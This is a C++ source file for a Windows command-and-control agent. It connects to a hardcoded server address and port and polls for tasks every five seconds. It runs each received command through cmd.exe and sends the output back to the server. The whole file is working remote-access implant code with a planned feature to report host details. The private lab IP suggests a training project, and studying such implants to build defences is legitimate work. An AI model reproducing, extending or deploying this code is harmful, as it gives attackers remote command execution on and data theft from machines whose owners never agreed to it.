#define WIN32_LEAN_AND_MEAN

#include<windows.h>
#include<winsock2.h>
#include<WS2tcpip.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<iostream>

#pragma comment(lib, "Ws2_32.lib")

#define DEFAULT_BUFFLEN 1024 //max bytes to send/recieve
#define DEFAULT_PORT "12102"
#define END_BYTE "\xff"

int send_message(const char* buffer, SOCKET ConnectSocket);
int run_command(const char* cmd, SOCKET ConnectSocket);

int main() {
	WSADATA wsaData;
	//initialize use of WS2_32.dll
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	//get address info for result
	struct addrinfo* result = NULL;
	struct addrinfo hints;
	ZeroMemory(&hints, sizeof(hints));

	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;
	
	//PLANNED FEATURE: get ip address of server and pass it into here before compile
	int iResult = getaddrinfo("192.168.232.1", DEFAULT_PORT, &hints, &result);

	if (iResult != 0) {
		printf("getaddrinfo failed with error %d\n", iResult);
		WSACleanup();
		return 1;
	}

	//Create socket and attempt to connect to server 
	SOCKET ConnectSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	iResult = connect(ConnectSocket, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
		printf("Unable to connect to C2\n");
		return 1;
	}
	freeaddrinfo(result);

	//Infinite loop that serves as the heartbeat
	while(true) {
		// Send a message to the server, asking for tasks
		//TODO: make this message the hostname, IP address, and OS info of the machine
		send(ConnectSocket, "gib tasks", strlen("gib tasks"), 0);

		//printf("Ready to recieve\n");

		//Recieving tasks to do
		char recvmessage[DEFAULT_BUFFLEN];
		ZeroMemory(recvmessage, DEFAULT_BUFFLEN);
		recv(ConnectSocket, recvmessage, DEFAULT_BUFFLEN, 0);

		if (strcmp(recvmessage, "close") == 0) { //quit
			send_message(END_BYTE, ConnectSocket);
			break;
		}
		else if (strcmp(recvmessage, "no tasks") != 0) { //is an acutal command to run 
			printf("Recieved task %s\n", recvmessage);
			run_command(recvmessage, ConnectSocket);
		}
		else {
			printf("No tasks to run\n");
			//send(ConnectSocket, "Hello Server!", strlen("Hello Server!"), 0);
			//send(ConnectSocket, "\xff", strlen("\xff"), 0);
		}
		Sleep(5000);
	}
	
	closesocket(ConnectSocket);
	WSACleanup();
	return 0;

}

//Method for sending a message through a socket
int send_message(const char* buffer, SOCKET ConnectSocket) {
	int bufferLen = (int)strlen(buffer) + 1;

	//Attempt to send a message
	int iResult;
	iResult = send(ConnectSocket, buffer, bufferLen, 0);
	if (iResult == SOCKET_ERROR) {
		return 1;
	}
	return 0;
}

//Function to handle executing commands and sending them to the server
int run_command(const char* cmd, SOCKET ConnectSocket) {
	//Creating handles for both ends of two pipes (STDIN and STDOUT)
	HANDLE g_hChildStd_IN_Wr = NULL;
	HANDLE g_hChildStd_IN_Rd = NULL;
	HANDLE g_hChildStd_OUT_Rd = NULL;
	HANDLE g_hChildStd_OUT_Wr = NULL;
	
	//Security Attributes sets whether handle retrieved by specifying this structure is inheritable
	SECURITY_ATTRIBUTES saAttr; 
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE; //pipe handles can be inherited 
	saAttr.lpSecurityDescriptor = NULL; ///default security descriptor 

	//Create pipe for child process's STDOUT
	if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0)) {
		return 1;
	}
	//Make sure read handle to pipe for STDOUT isn't inherited
	if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0)) {
		return 1;
	}
	//Create pipe for child process's STDIN
	if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0)) {
		return 1;
	}
	//Make sure write handle to pipe for STDIN isn't inherited
	if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0)) {
		return 1;
	}

	//Making the command string
	size_t cmdBufLength = 32 + strlen(cmd);
	std::string fCmd = "C:\\Windows\\System32\\cmd.exe /c ";
	fCmd.append(cmd);
	LPSTR aCmd = const_cast<char*>(fCmd.c_str());

	//Creating and starting the child process
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	BOOL bSuccess = FALSE;
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

	//Set up members of the STARTUPINFO structure (specify STDIN and STDOUT handles)
	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	si.hStdError = g_hChildStd_OUT_Wr;
	si.hStdOutput = g_hChildStd_OUT_Wr;
	si.hStdInput = g_hChildStd_IN_Rd;
	si.dwFlags |= STARTF_USESTDHANDLES;

	//Creating the child process
	bSuccess = CreateProcessA(
		NULL,					//Name of application 
		aCmd,					//Command line to run
		NULL,					//Security attributes pointer (handle to process obj can't be inherited if NULL)
		NULL,					//Security attributes pointer (handle to thread obj can't be inherited if NULL)
		TRUE,					//Inheritable handles in calling prcess can be inherited by new process
		NULL,		//Priority class and creation of process (doesn't create a console window with CREATE_NO_WINDOW)
		NULL,					//Environment block for new process 
		NULL,					//Current directory for process
		(LPSTARTUPINFOA)&si,	//STARTUPINFO structure pointer
		&pi						//PROCESS_INFORMATION pointer
	);

	//If an error occurs, return code 2
	if (!bSuccess) {
		return 2;
	}
	else {
		//Close handles to the child process and primary thread
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);

		//Close handles to stdin and stdout pipes
		CloseHandle(g_hChildStd_OUT_Wr);
		CloseHandle(g_hChildStd_IN_Rd);
		g_hChildStd_OUT_Wr = 0;
		g_hChildStd_IN_Rd = 0;
	}

	//Setting up output
	DWORD dwRead, dwWritten;
	CHAR chBuf[4096];
	BOOL cSuccess = FALSE;
	HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

	ZeroMemory(&chBuf, sizeof(chBuf));
	printf("Output\n");
	//Loop to read from output buffer, send to server, and write to parent output (debug purposes)
	for (;;) {
		//Sending to server
		cSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, 4096, &dwRead, NULL);
		if (!cSuccess || dwRead == 0) { //No more output
			printf("no more output\n");
			break;
		}
		else { //Send to server
			if (send_message(chBuf, ConnectSocket) != 0) {
				printf("Error sending to server, error %d\n", WSAGetLastError());
			}
		}

		//Writing to parent output
		cSuccess = WriteFile(hParentStdOut, chBuf, dwRead, &dwWritten, NULL);
		if (!cSuccess) {
			printf("no more output\n");
			break;
		}
		else {
			ZeroMemory(&chBuf, sizeof(chBuf));
		}
	}

	printf("child process done\n");
	//Send end byte
	send_message(END_BYTE, ConnectSocket);

	return 0;
}